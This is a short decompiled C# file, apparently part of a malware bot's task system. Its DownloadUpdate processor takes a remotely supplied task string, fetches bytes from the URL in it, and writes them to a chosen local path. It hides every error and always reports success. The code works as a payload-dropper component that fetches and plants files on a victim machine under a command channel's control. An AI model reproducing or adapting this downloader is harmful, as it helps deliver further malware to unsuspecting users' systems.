using System;
using System.IO;
using System.Net;

// Token: 0x0200002F RID: 47
public class DownloadUpdate : ITaskProcessor
{
	// Token: 0x060000FE RID: 254 RVA: 0x0000331E File Offset: 0x0000151E
	public bool IsValidAction(Entity_UpdateAction action)
	{
		return action == Entity_UpdateAction.Id1;
	}

	// Token: 0x060000FF RID: 255 RVA: 0x00009604 File Offset: 0x00007804
	public bool Process(Entity_Task updateTask)
	{
		try
		{
			string[] array = updateTask.Id2.Split(new string[]
			{
				"|"
			}, StringSplitOptions.RemoveEmptyEntries);
			File.WriteAllBytes(Environment.ExpandEnvironmentVariables(array[1]), new WebClient().DownloadData(array[0]));
		}
		catch
		{
		}
		return true;
	}
}
